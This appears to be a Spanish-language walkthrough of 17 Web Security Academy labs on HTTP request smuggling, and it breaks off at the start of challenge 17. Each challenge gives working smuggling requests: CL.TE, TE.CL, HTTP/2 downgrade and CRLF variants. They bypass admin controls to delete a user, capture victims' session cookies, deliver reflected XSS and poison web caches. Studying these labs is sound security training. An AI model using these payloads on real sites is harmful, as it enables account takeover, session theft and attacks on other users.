## Reto 1: Contrabando de solicitudes HTTP, confirmación de una vulnerabilidad CL.TE mediante respuestas diferenciales


Este laboratorio implica un servidor front-end y un servidor back-end, y el servidor front-end no admite la codificación fragmentada.

Para resolver el laboratorio, envíe de contrabando una solicitud al servidor back-end, de modo que se pueda realizar una solicitud posterior. /(la raíz web) activa una respuesta 404 No encontrado. 

Modificamos el `Content-Length: 41` y el `Transfer-Encoding: chunked` y añadimos un solicitud a un sitio que no existe con una cabecera de ejemplo para que sea aceptada , finalmente obtenemos el error 404.

```
POST / HTTP/1.1
Host: 0ad4003703e8c88f80e8d651003d00e3.web-security-academy.net
Content-Length: 41
Transfer-Encoding: chunked
3
abc
0
GET /error HTTP/1.1
Test: A
```

## Reto 2: Contrabando de solicitudes HTTP, confirmación de una vulnerabilidad TE.CL mediante respuestas diferenciales

Este laboratorio implica un servidor front-end y un servidor back-end, y el servidor back-end no admite la codificación fragmentada.

Para resolver el laboratorio, envíe de contrabando una solicitud al servidor back-end, de modo que se pueda realizar una solicitud posterior. `/` (la raíz web) activa una respuesta 404 No encontrado. 

Esta variante de HTTP request smuggling basada en la combinación TE.CL, donde el front-end permite codificación chunked y el back-end no. El objetivo es verificar si existe una desincronización entre ambos servidores manipulando los encabezados de longitud y codificación de la petición.

A través de dos envíos consecutivos desde Burp Repeater, provocamos una situación donde la segunda petición se ve afectada por los restos interpretados desde la primera, desencadenando una respuesta 404 inesperada en la raíz del sitio. 
```
POST / HTTP/1.1
Host: 0a5a00c8041eb13b81eaac5a007c0028.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 4
38
POST /error HTTP/1.1
Content-Length: 30
testing=test
0
```
## Reto 3: Explotación del contrabando de solicitudes HTTP para eludir los controles de seguridad del frontend, vulnerabilidad CL.TE

Este laboratorio implica un servidor front-end y uno back-end, y el servidor front-end no admite la codificación fragmentada. Hay un panel de administración en /admin, pero el servidor front-end bloquea el acceso a él.

Para resolver el laboratorio, envíe de contrabando una solicitud al servidor back-end que accede al panel de administración y elimina al usuario. carlos. 

Aplicamos la técnica de HTTP request smuggling con una combinación CL.TE para evadir controles de acceso impuestos por el front-end. El objetivo es acceder al panel de administración, normalmente restringido, y eliminar al usuario carlos desde el back-end.

Para ello, construimos una petición maliciosa que el front-end interpreta como finalizada tras leer los bytes indicados por Content-Length, pero que en realidad contiene una segunda petición HTTP embebida. Esta segunda petición es procesada por el back-end de forma independiente y sin las restricciones del front-end, lo que nos permite interactuar con rutas protegidas como /admin o /admin/delete.

```
POST / HTTP/1.1
Host: 0a0d00b503aada46808c80b800650056.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 97
Transfer-Encoding: chunked
0
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Length: 12
test=test
```

## Reto 4: Explotación del contrabando de solicitudes HTTP para eludir los controles de seguridad del frontend, vulnerabilidad TE.CL

Este laboratorio implica un servidor front-end y uno back-end, y el servidor back-end no admite la codificación fragmentada. Hay un panel de administración en /admin, pero el servidor front-end bloquea el acceso a él.

Para resolver el laboratorio, envíe de contrabando una solicitud al servidor back-end que accede al panel de administración y elimina al usuario. carlos. 

Explotamos una vulnerabilidad TE.CL (Transfer-Encoding + Content-Length) para realizar HTTP request smuggling y evadir las restricciones de acceso impuestas por el front-end. El objetivo es acceder a rutas protegidas como /admin o /admin/delete que no están disponibles directamente desde el navegador.

Utilizamos una petición malformada con codificación chunked para engañar al front-end y que interprete una longitud de contenido más corta de lo que realmente se está enviando. Esto permite que el back-end procese una segunda petición embebida que el front-end nunca llega a validar.

Durante la clase, mostramos cómo construir y ajustar la petición smuggled para que incluya la cabecera ‘Host: localhost‘, necesaria para que el back-end acepte la acción administrativa.

```
POST / HTTP/1.1
Host: 0a0b008303b3ce7b806a802f002c006c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 4
5f
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Length: 25
test=testing
0
```
## Reto 5: Explotación del contrabando de solicitudes HTTP para revelar la reescritura de solicitudes del frontend

Este laboratorio implica un servidor front-end y un servidor back-end, y el servidor front-end no admite la codificación fragmentada.

Hay un panel de administración en /admin, pero solo es accesible para personas con la dirección IP 127.0.0.1. El servidor front-end agrega un encabezado HTTP a las solicitudes entrantes que contienen su dirección IP. Es similar a... X-Forwarded-For encabezado pero tiene un nombre diferente.

Para resolver el laboratorio, envíe una solicitud al servidor backend que revele el encabezado agregado por el servidor frontend. Luego, envíe una solicitud al servidor backend que incluya el encabezado agregado, acceda al panel de administración y elimine al usuario. carlos. 

aprovechar una vulnerabilidad de HTTP request smuggling para identificar cabeceras que el servidor front-end añade a las peticiones entrantes. Estas cabeceras pueden determinar el acceso a zonas restringidas, como el panel de administración.

Primero, utilizamos un ataque de tipo CL.TE para inyectar una petición secundaria y observar cómo el front-end reescribe el tráfico. Al examinar la respuesta del back-end, logramos identificar la cabecera que transporta la IP del cliente. Luego, reproducimos el ataque incluyendo esta cabecera manualmente con el valor 127.0.0.1, lo que nos permite acceder al panel /admin.

Finalmente, modificamos la petición smuggled para apuntar a ‘/admin/delete?username=carlos‘

```
POST / HTTP/1.1
Host: 0aeb00b8037a64b1801c672d008d0005.web-security-academy.net
Cookie: session=ZlxWzuMP3ud4EAOcfMPTBDBcD86HSDi8
Content-Length: 106
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
0
GET /admin/delete?username=carlos HTTP/1.1
X-wbTTHP-Ip: 127.0.0.1
Content-Length: 13
search=test
```

## Reto 6: Explotación del contrabando de solicitudes HTTP para capturar las solicitudes de otros usuarios 


Este laboratorio implica un servidor front-end y un servidor back-end, y el servidor front-end no admite la codificación fragmentada. Para resolver el laboratorio, envíe una solicitud al servidor backend de forma clandestina, lo que provocará que la solicitud del siguiente usuario se almacene en la aplicación. Luego, recupere la solicitud del siguiente usuario y use las cookies del usuario víctima para acceder a su cuenta.

logramos capturar una petición legítima del siguiente usuario mediante un ataque de HTTP request smuggling. En esta parte, analizamos el contenido del comentario almacenado para extraer la cookie de sesión de la víctima.

Una vez identificamos el valor de la ‘cookie session‘ en la petición capturada, la utilizamos para suplantar la identidad del usuario y acceder a su cuenta. Este paso demuestra cómo una simple desincronización entre servidores puede derivar en la total toma de control de una cuenta ajena.

```
POST / HTTP/1.1
Host: 0a1600ee032ff18a80fa3ab200a40000.web-security-academy.net
Content-Length: 278
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded
0
POST /post/comment HTTP/1.1
Cookie: session=G3hQ5rPsQkWhgVNsUporKSntyTG2eFnv
Content-Type: application/x-www-form-urlencoded
Content-Length: 950
csrf=2589KdABOiSwgsRJOipAkDFtso8MIhqX&postId=2&name=test&email=test%40test.com&website=https%3A%2F%2Ftest.com&comment=test
```

## Reto 7: Explotación del contrabando de solicitudes HTTP para entregar XSS reflejado


Este laboratorio implica un servidor front-end y un servidor back-end, y el servidor front-end no admite la codificación fragmentada.

La aplicación también es vulnerable a XSS reflejado a través de User-Agentencabezado.

Para resolver el laboratorio, envíe de contrabando una solicitud al servidor back-end que haga que la siguiente solicitud del usuario reciba una respuesta que contenga un exploit XSS que se ejecute. alert(1)

combinamos un ataque de HTTP request smuggling con una vulnerabilidad de XSS reflejado que afecta a la cabecera User-Agent. El objetivo es hacer que la siguiente petición de un usuario legítimo reciba una respuesta que incluya nuestra carga maliciosa.

Para lograrlo, manipulamos la longitud de la petición y ocultamos una petición HTTP secundaria con el ‘User-Agent‘ alterado. La víctima, al visitar la aplicación, carga sin saberlo una página que ejecuta JavaScript, concretamente ‘alert(1)‘, validando la explotación.

```
POST / HTTP/1.1
Host: 0ab7006304ba3ab380000333002a003d.web-security-academy.net
Content-Length: 72
Transfer-Encoding: chunked
0
GET /post?postId=9 HTTP/1.1
User-Agent:"><script>alert(1)</script>
```

## Reto 8: Envenenamiento de la cola de respuesta mediante contrabando de solicitudes H2.TE

Este laboratorio es vulnerable al contrabando de solicitudes porque el servidor front-end degrada las solicitudes HTTP/2 incluso si tienen una longitud ambigua.

Para resolver el laboratorio, elimine el usuario. carlosmediante el uso del envenenamiento de la cola de respuesta para entrar en el panel de administración en /adminUn usuario administrador iniciará sesión aproximadamente cada 15 segundos.

La conexión con el back-end se restablece cada 10 solicitudes, así que no te preocupes si la colocas en mal estado: simplemente envía algunas solicitudes normales para obtener una nueva conexión. 

```
POST /x HTTP/2
Host: 0a2100b80418302481b348380024001d.web-security-academy.net
Transfer-Encoding: chunked
0
GET /x HTTP/1.1
Host: 0a2100b80418302481b348380024001d.web-security-academy.net
```

## Reto 9:Contrabando de solicitudes H2.CL


Este laboratorio es vulnerable al contrabando de solicitudes porque el servidor front-end degrada las solicitudes HTTP/2 incluso si tienen una longitud ambigua.

Para resolver el laboratorio, realice un ataque de contrabando de solicitudes que haga que el navegador de la víctima cargue y ejecute un archivo JavaScript malicioso desde el servidor de explotación, llamando alert(document.cookie)El usuario víctima accede a la página de inicio cada 10 segundos. 

El ataque de request smuggling utilizando HTTP/2 con un encabezado ‘Content-Length‘ malicioso (H2.CL), cuyo objetivo es hacer que el navegador de la víctima cargue y ejecute un archivo JavaScript desde nuestro servidor malicioso.

Aprovechamos una redirección automática al acceder a /resources, lo que nos permite inyectar una petición que, al ser procesada por el back-end, provoca que la víctima sea redirigida al exploit server donde se aloja nuestro payload ‘alert(document.cookie)‘.

La clave está en enviar la petición en el momento justo en que el administrador accede a la página, ya que este tráfico será el que acabe siendo redirigido gracias a la cola de respuestas envenenada

```
POST / HTTP/2
Host: 0a8500590474169680302b8c006a00df.web-security-academy.net
Content-Length: 14
test=testing
GET /resources HTTP/1.1
Host: exploit-0af700dd042d169e80262a1101da006d.exploit-server.net
Content-Length: 11
test=test
```

## Reto 10: Contrabando de solicitudes HTTP/2 mediante inyección CRLF

Este laboratorio es vulnerable al contrabando de solicitudes porque el servidor front-end degrada las solicitudes HTTP/2 y no logra desinfectar adecuadamente los encabezados entrantes.

Para resolver el laboratorio, utilice un vector de contrabando de solicitudes exclusivo de HTTP/2 para acceder a la cuenta de otro usuario. La víctima accede a la página de inicio cada 15 segundos.

Si no está familiarizado con las funciones exclusivas de Burp para pruebas HTTP/2, consulte la documentación para obtener detalles sobre cómo usarlas. 

provechando una mala sanitización de cabeceras por parte del front-end. Usamos un vector exclusivo de HTTP/2 basado en inyección CRLF dentro del valor de una cabecera, lo que nos permite introducir una cabecera ‘Transfer-Encoding: chunked‘ maliciosa y un cuerpo que termina en 0.

Este smuggling provoca que el backend procese parcialmente nuestra petición y mezcle el siguiente request del usuario víctima con la cola de respuestas, exponiendo su sesión en nuestro historial de búsquedas. Capturamos su token de sesión, lo reutilizamos, y accedemos a su cuenta para completar el laboratorio.

```
0
POST / HTTP/1.1
Host: 0a36002404f4a12c813df2cf008800ae.web-security-academy.net
Cookie: session=YF7K0dOskMH7VLULRyo4q9PZdRISnIJp
Content-Length: 850
search=x
```

## Reto 11: Contrabando de solicitudes CL.0

Este laboratorio es vulnerable a ataques de contrabando de solicitudes CL.0. El servidor back-end ignora la Content-Length encabezado en solicitudes a algunos puntos finales.

Para resolver el laboratorio, identifique un punto final vulnerable, envíe de contrabando una solicitud al back-end para acceder al panel de administración en /admin, luego elimine el usuario carlos.

Realizamos un ataque de request smuggling tipo CL.0, donde el servidor back-end ignora el encabezado Content-Length en ciertas rutas, permitiendo inyectar una segunda petición dentro del cuerpo de una POST aparentemente legítima.

Tras identificar un endpoint vulnerable (por ejemplo, /resources/images/blog.svg), utilizamos esta vía para smugglear una solicitud que accede al panel de administración. Finalmente, aprovechamos este comportamiento para enviar una petición oculta que elimina al usuario carlos


```
POST /resources/images/blog.svg HTTP/1.1
Host: 0a96000c03676f2481ba116a007000bd.web-security-academy.net
Content-Length: 53
GET /admin/delete?username=carlos HTTP/1.1
Test: A
```


## Reto 12: Contrabando de solicitudes HTTP, vulnerabilidad básica CL.TE


Este laboratorio utiliza un servidor front-end y uno back-end, y el servidor front-end no admite la codificación fragmentada. El servidor front-end rechaza las solicitudes que no utilizan los métodos GET o POST.

Para resolver el laboratorio, envíe de contrabando una solicitud al servidor back-end, de modo que la siguiente solicitud procesada por el servidor back-end parezca utilizar el método GPOST.  

ataque de HTTP request smuggling CL.TE en su forma más simple. Aprovechamos que el front-end no admite chunked encoding, pero el back-end sí, para inyectar un fragmento que hará que la siguiente petición se interprete con un método inválido como GPOST. Esto nos permite confirmar la vulnerabilidad observando la respuesta del servidor. 

```
POST / HTTP/1.1
Host: 0a4c006303da8a9c81c6c5fc00f100bc.web-security-academy.net
Content-Length: 6
Transfer-Encoding: chunked
0
G
```

## Reto 13: Contrabando de solicitudes HTTP, vulnerabilidad básica de TE.CL

Este laboratorio utiliza un servidor front-end y uno back-end, y el back-end no admite la codificación fragmentada. El front-end rechaza las solicitudes que no utilizan los métodos GET o POST.

Para resolver el laboratorio, envíe de contrabando una solicitud al servidor back-end, de modo que la siguiente solicitud procesada por el servidor back-end parezca utilizar el método GPOST. 

HTTP request smuggling de tipo TE.CL, donde el front-end acepta chunked encoding, pero el back-end no lo soporta. Aprovechamos esta diferencia para inyectar una petición que será reinterpretada por el back-end como si usara el método GPOST.

```
POST / HTTP/1.1
Host: 0a9300d10479c57f804df8e700e200ee.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 4
72
GPOST / HTTP/1.1
Host: 0a9300d10479c57f804df8e700e200ee.web-security-academy.net
Content-Length: 20
test=test
0
```

## Reto 14: Contrabando de solicitudes HTTP, ofuscación del encabezado TE

Este laboratorio utiliza un servidor front-end y uno back-end, y ambos gestionan las cabeceras de solicitud HTTP duplicadas de forma diferente. El servidor front-end rechaza las solicitudes que no utilizan los métodos GET o POST.

Para resolver el laboratorio, envíe de contrabando una solicitud al servidor back-end, de modo que la siguiente solicitud procesada por el servidor back-end parezca utilizar el método GPOST.


```
POST / HTTP/1.1
Host: 0a35004903426a3c807267b5002e003a.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: invalido
72
GPOST / HTTP/1.1
Host: 0a35004903426a3c807267b5002e003a.web-security-academy.net
Content-Length: 20
test=test
0
```

## Reto 15: Explotación del contrabando de solicitudes HTTP para envenenar la caché web


Este laboratorio utiliza un servidor front-end y uno back-end, y el servidor front-end no admite la codificación fragmentada. El servidor front-end está configurado para almacenar en caché ciertas respuestas.

Para resolver el laboratorio, realice un ataque de contrabando de solicitudes que envenene la caché, de modo que una solicitud posterior de un archivo JavaScript reciba una redirección al servidor del exploit. La caché envenenada debería alertar document.cookie. 

Este ataque avanzado de HTTP request smuggling para lograr un web cache poisoning. Usamos la diferencia de interpretación entre el front-end y el back-end para inyectar una redirección maliciosa en la caché del servidor. Al lograr que el fichero JavaScript ‘tracking.js‘ apunte al exploit server, conseguimos que el navegador de la víctima cargue un payload con ‘alert(document.cookie)‘

```
POST / HTTP/1.1
Host: 0a0d00c00308cf94805e2bcc006500d8.web-security-academy.net
Content-Length: 137
Transfer-Encoding: chunked
0
GET /post/next?postId=3 HTTP/1.1
Host: exploit-0a3800af0322cf1580752a61017d008c.exploit-server.net
Content-Length: 20
test=test
```

## Reto 16:Exploiting HTTP request smuggling to perform web cache deception

Explotación del contrabando de solicitudes HTTP para engañar a los usuarios de la caché web

Este laboratorio utiliza un servidor front-end y uno back-end, y el servidor front-end no admite la codificación fragmentada. El servidor front-end almacena en caché recursos estáticos.

Para resolver el laboratorio, realice un ataque de contrabando de solicitudes para que la siguiente solicitud del usuario guarde su clave API en la caché. A continuación, recupere la clave API del usuario víctima de la caché y envíela como solución del laboratorio. Deberá esperar 30 segundos desde el acceso al laboratorio antes de intentar engañar a la víctima para que guarde su clave API en caché.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter 

Este ataque avanzado de web cache deception combinado con HTTP request smuggling. Manipulamos una petición para hacer que la solicitud de /my-account del usuario víctima quede almacenada en la caché del servidor, exponiendo así su API Key.

Una vez envenenada la caché, accedemos al contenido como si fuera un recurso estático.


Petición con la Request Smuggling
```
POST / HTTP/1.1
Host: 0a880065036c4b5a802b713f0032004a.web-security-academy.net
Content-Length: 38
Transfer-Encoding: chunked
0
GET /my-account HTTP/1.1
Test: A
```

```
GET /resources/js/tracking.js HTTP/1.1
Host: 0a880065036c4b5a802b713f0032004a.web-security-academy.net
Cookie: session=uVw3TnVPPfyNhD6k2rKE4xpzTAPe94aW
Cache-Control: max-age=0
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a880065036c4b5a802b713f0032004a.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```


## Reto 17: Cómo eludir los controles de acceso mediante la tunelización de solicitudes HTTP/2

Este laboratorio es vulnerable al contrabando de solicitudes porque el servidor frontend degrada las solicitudes HTTP/2 y no limpia adecuadamente los nombres de los encabezados entrantes. Para solucionar el problema, acceda al panel de administración en /admincomo el administratorusuario y eliminar el usuario carlos.

El servidor front-end no reutiliza la conexión con el back-end, por lo que no es vulnerable a los ataques clásicos de contrabando de solicitudes. Sin embargo, sí es vulnerable a la tunelización de solicitudes . 